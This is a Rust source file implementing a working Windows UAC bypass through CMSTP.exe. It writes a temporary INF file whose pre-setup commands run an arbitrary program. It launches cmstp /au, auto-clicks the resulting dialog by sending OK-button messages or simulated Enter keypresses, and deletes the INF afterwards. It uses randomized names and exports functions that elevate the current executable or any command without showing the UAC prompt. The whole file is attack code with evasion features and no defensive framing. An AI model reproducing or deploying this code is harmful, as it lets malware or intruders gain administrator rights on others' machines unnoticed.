//! UAC Auto-Elevation via CMSTP bypass.
//!
//! Uses the CMSTP.exe (Connection Manager Profile Installer) to achieve
//! auto-elevation without triggering the standard UAC prompt.

use std::fs::File;
use std::io::Write;
use std::path::Path;
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;

use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;

use windows::core::{PCSTR, PWSTR};
use windows::Win32::Foundation::{CloseHandle, HWND, LPARAM, MAX_PATH, WPARAM};
use windows::Win32::System::ProcessStatus::EnumProcesses;
use windows::Win32::System::Threading::{
    OpenProcess, QueryFullProcessImageNameW, PROCESS_NAME_WIN32, PROCESS_QUERY_LIMITED_INFORMATION,
};
use windows::Win32::UI::Input::KeyboardAndMouse::{
    SendInput, INPUT, INPUT_KEYBOARD, KEYBDINPUT, KEYEVENTF_KEYUP, VK_RETURN,
};
use windows::Win32::UI::WindowsAndMessaging::{
    FindWindowA, FindWindowExA, SendMessageA, SetForegroundWindow, ShowWindow,
    BM_CLICK, SW_SHOWNORMAL,
};

/// Generate a random service name (8-12 alphanumeric chars)
fn generate_random_name() -> String {
    let len = 8 + (fastrand::usize(0..5)); // 8-12 chars
    (0..len)
        .map(|_| {
            let idx = fastrand::usize(0..36);
            if idx < 10 {
                (b'0' + idx as u8) as char
            } else {
                (b'A' + (idx - 10) as u8) as char
            }
        })
        .collect()
}

/// Generate INF content with randomized service name
fn generate_inf_content(command: &str, service_name: &str) -> String {
    format!(r#"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
{}
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="{}"
ShortSvcName="{}"
"#, command, service_name, service_name)
}

/// Generate an INF file with the command to execute, returns (path, service_name)
fn generate_inf_file(command: &str) -> std::io::Result<(String, String)> {
    let temp_dir = std::env::temp_dir();
    let random_name = format!("{}.inf", uuid::Uuid::new_v4());
    let inf_path = temp_dir.join(random_name);

    let service_name = generate_random_name();
    let inf_data = generate_inf_content(command, &service_name);

    let mut file = File::create(&inf_path)?;
    file.write_all(inf_data.as_bytes())?;

    Ok((inf_path.to_string_lossy().to_string(), service_name))
}

/// Simulate pressing the Enter key
fn simulate_enter_keypress() {
    unsafe {
        let mut inputs: [INPUT; 2] = std::mem::zeroed();

        // Key down
        inputs[0].r#type = INPUT_KEYBOARD;
        inputs[0].Anonymous.ki = KEYBDINPUT {
            wVk: VK_RETURN,
            wScan: 0,
            dwFlags: Default::default(),
            time: 0,
            dwExtraInfo: 0,
        };

        // Key up
        inputs[1].r#type = INPUT_KEYBOARD;
        inputs[1].Anonymous.ki = KEYBDINPUT {
            wVk: VK_RETURN,
            wScan: 0,
            dwFlags: KEYEVENTF_KEYUP,
            time: 0,
            dwExtraInfo: 0,
        };

        SendInput(&inputs, std::mem::size_of::<INPUT>() as i32);
    }
}

/// Find and interact with the CMSTP window to auto-accept
fn interact_with_cmstp_window(service_name: &str) -> bool {
    // Build null-terminated window title strings
    let service_title = format!("{}\0", service_name);
    let cmstp_title = "cmstp\0";
    let ok_button = "OK\0";

    // Try for up to 10 seconds
    for _ in 0..100 {
        for title in &[service_title.as_str(), cmstp_title] {
            unsafe {
                let hwnd = match FindWindowA(PCSTR::null(), PCSTR(title.as_ptr())) {
                    Ok(h) if h != HWND::default() => h,
                    _ => continue,
                };

                let _ = SetForegroundWindow(hwnd);
                ShowWindow(hwnd, SW_SHOWNORMAL);

                // Try to find and click OK button
                if let Ok(ok_btn) = FindWindowExA(
                    Some(hwnd),
                    None,
                    PCSTR::null(),
                    PCSTR(ok_button.as_ptr()),
                ) {
                    if ok_btn != HWND::default() {
                        SendMessageA(ok_btn, BM_CLICK, WPARAM(0), LPARAM(0));
                        return true;
                    }
                }

                // Fallback: simulate Enter key
                simulate_enter_keypress();
                return true;
            }
        }

        thread::sleep(Duration::from_millis(100));
    }

    false
}

/// Check if another instance of our executable is running (excluding our own PID)
fn is_elevated_instance_running(our_exe: &Path, our_pid: u32) -> bool {
    unsafe {
        let mut pids = vec![0u32; 1024];
        let mut bytes_returned: u32 = 0;

        if EnumProcesses(
            pids.as_mut_ptr(),
            (pids.len() * std::mem::size_of::<u32>()) as u32,
            &mut bytes_returned,
        )
        .is_err()
        {
            return false;
        }

        let num_pids = bytes_returned as usize / std::mem::size_of::<u32>();

        for &pid in &pids[..num_pids] {
            if pid == 0 || pid == our_pid {
                continue;
            }

            let Ok(handle) = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid) else {
                continue;
            };

            let mut buf = [0u16; MAX_PATH as usize];
            let mut size = buf.len() as u32;

            if QueryFullProcessImageNameW(handle, PROCESS_NAME_WIN32, PWSTR(buf.as_mut_ptr()), &mut size).is_ok() {
                let exe_path = OsString::from_wide(&buf[..size as usize]);
                if Path::new(&exe_path) == our_exe {
                    let _ = CloseHandle(handle);
                    return true;
                }
            }

            let _ = CloseHandle(handle);
        }
    }

    false
}

/// Execute CMSTP with the INF file
fn execute_cmstp(inf_file: &str, service_name: String) -> std::io::Result<()> {
    let cmstp_path = r"C:\Windows\System32\cmstp.exe";

    if !Path::new(cmstp_path).exists() {
        return Err(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "cmstp.exe not found",
        ));
    }

    // Spawn CMSTP in background
    let mut child = Command::new(cmstp_path)
        .arg("/au")
        .arg(inf_file)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()?;

    // Spawn a thread to handle window interaction
    let inf_path = inf_file.to_string();
    thread::spawn(move || {
        interact_with_cmstp_window(&service_name);

        // Cleanup: remove INF file after a delay
        thread::sleep(Duration::from_secs(2));
        let _ = std::fs::remove_file(&inf_path);
    });

    // Watchdog: wait for elevated process to spawn, then kill cmstp and exit
    let our_pid = std::process::id();
    let our_exe = std::env::current_exe().ok();

    for _ in 0..50 {
        // Check every 100ms for up to 5 seconds
        thread::sleep(Duration::from_millis(100));

        if let Some(ref exe_path) = our_exe {
            if is_elevated_instance_running(exe_path, our_pid) {
                // Kill cmstp before exiting
                let _ = child.kill();
                let _ = child.wait();
                std::process::exit(0);
            }
        }
    }

    // Timeout fallback - kill cmstp and exit anyway
    let _ = child.kill();
    let _ = child.wait();
    Ok(())
}

/// Perform auto-elevation using CMSTP bypass.
///
/// This will re-launch the current executable with elevated privileges
/// without showing the standard UAC prompt.
///
/// Returns true if elevation was initiated, false on error.
pub fn auto_elevate() -> bool {
    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return false,
    };

    let exe_str = exe_path.to_string_lossy();
    let command = format!("\"{}\"", exe_str);

    let (inf_file, service_name) = match generate_inf_file(&command) {
        Ok(result) => result,
        Err(_) => return false,
    };

    execute_cmstp(&inf_file, service_name).is_ok()
}

/// Perform auto-elevation for an arbitrary command.
///
/// This allows running any command with elevated privileges.
pub fn auto_elevate_command(command: &str) -> bool {
    let (inf_file, service_name) = match generate_inf_file(command) {
        Ok(result) => result,
        Err(_) => return false,
    };

    execute_cmstp(&inf_file, service_name).is_ok()
}
